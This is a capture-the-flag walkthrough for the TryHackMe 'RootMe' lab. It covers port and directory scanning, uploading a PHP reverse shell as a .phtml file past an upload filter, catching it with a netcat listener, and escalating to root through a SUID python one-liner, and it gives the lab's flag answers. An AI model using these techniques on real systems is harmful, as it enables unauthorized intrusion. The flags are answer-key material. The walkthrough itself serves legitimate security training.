# **TryHackMe RootMe**
*Walkthrough using Kali Linux by Leonidas Karagkounis*

https://tryhackme.com/room/rrootme

## **Reconnaissance**
Start by using nmap to scan for ports and services
```
nmap -sC -sV <target_ip> 
```
1. **Scan the machine, how many ports are open?**  
```
2
```
2. **What version of Apache is running?** 
```
2.4.29
```
3. **What service is running on port 22?**
```
ssh
```
## **Locating directories using Gobuster**
Running gobuster to find hidden directories
```
gobuster dir --url http://<target_ip> --wordlist ~/Downloads/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 24 -x php,bak,zip,txt

```

4. **What is the hidden directory?**  
```
/panel/

```




### **Getting a shell**
## **Compromise the webserver**

Visit <target_ip>/panel/

We can exploit this by uploading a php reverse shell

- Download php-reverse-shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

- Open the file and edit the $ip = '127.0.0.1' with your machine's ip. If you dont know what is your ip, type ifconfig and check the tun0 interface.

    *You can also change the $port = 1234 if you want to something else like 9001 for example which is what i did and if you follow along change it as well, otherwise make sure to change the commands later on with the appropriate port number.*

- When we try and upload the file we get an error message. Trying different file types we find out we can upload .phtml files. The technique on how to scan is explained on the Vulnversity write up [here](https://github.com/KaragkounisL/TryHackMe-Writeups/blob/main/Vulnversity.md).

- Make a copy as php.reverse-shell.phtml.

- Set up a netcat listener with the command :  
```
nc -nlvp 9001
```

- Upload the php-reverse-shell.phtml file to the webserver and go to the webpage 
```
http://<target_ip>/uploads/php-reverse-shell.phtml
```
 
This will execute the script and return a reverse shell in your listener. 

### **Getting the user flag**
Typing 
```
whoami
```
we get the response www-data. The home directory of this user is the var/www folder.
We navigate that folder using 
``` 
cd /var/www
```
and we type 
```
ls -al
```

There we can find the user.txt and we can see its contents by typing

```
cat user.txt
```

4. **user.txt** 
```
THM{y0u_g0t_a_sh3ll}
```

## **Privilege Escalation**
Start by typing 
```
find / -user root -perm /4000 2>/dev/null
```

1. **Search for files with SUID permission, which file is weird?** 
```
/usr/bin/python
```

### **Getting a root shell**

We can visit GTFOBins and search for the python binary

https://gtfobins.github.io/gtfobins/python/

Under the SUID category we find what we are searching for
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### **Geting the root flag**

Executing the command gives us root access which we can confirm by typing 
```
whoami
```
Navigate into the original folder and then into theroot folder by using 
```
cd ../../
cd /root
``` 
Type 
```
ls -al
``` 
You should see the root.txt flag. Check the content with 
```
cat root.txt
```

2. **root.txt**
```
THM{pr1v1l3g3_3sc4l4t10n}
```
